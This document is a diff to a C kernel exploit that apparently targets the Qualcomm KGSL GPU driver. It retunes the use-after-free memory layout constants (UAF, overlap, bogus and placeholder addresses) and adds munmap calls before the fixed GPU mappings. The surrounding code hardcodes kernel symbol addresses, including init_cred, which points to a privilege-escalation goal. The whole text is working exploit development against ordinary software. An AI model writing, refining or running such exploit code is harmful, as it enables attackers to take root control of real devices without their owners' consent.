@@ -16,6 +16,7 @@
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 #include <sys/wait.h>
+#include <signal.h>
 #include <sys/select.h>
 #include <poll.h>
 #include <sys/stat.h>
@@ -68,17 +69,15 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
-#define UAF_SIZE  0x10004000ULL
-#define OVERLAP_SIZE 0x7000ULL
 
-
-#define UAF_ADDR  0x7000000000ULL
-#define OVERLAP_ADDR 0x7000001000ULL
-#define BOGUS_ADDR 0x7000002000ULL
-#define PLACEHOLDER_ADDR 0x7000003000ULL
-
-#define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
+#define UAF_ADDR         0x60000000ULL
+#define UAF_SIZE         0x10000000ULL
+#define OVERLAP_ADDR     0x60001000ULL
+#define OVERLAP_SIZE     0x7000ULL
+#define BOGUS_ADDR       0x60002000ULL
+#define BOGUS_SIZE       0xffffffffffefd000ULL
+#define PLACEHOLDER_ADDR 0x61000000ULL
+#define PLACEHOLDER_SIZE 0x10000000ULL
 
 #define VMLINUX_TEXT      0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
@@ -277,6 +276,8 @@ int main(int argc, char **argv) {
 
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
+
+    munmap((void*)UAF_ADDR, UAF_SIZE);
     int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
     void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
@@ -286,6 +287,7 @@ int main(int argc, char **argv) {
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
+    munmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE);
     int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
     void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
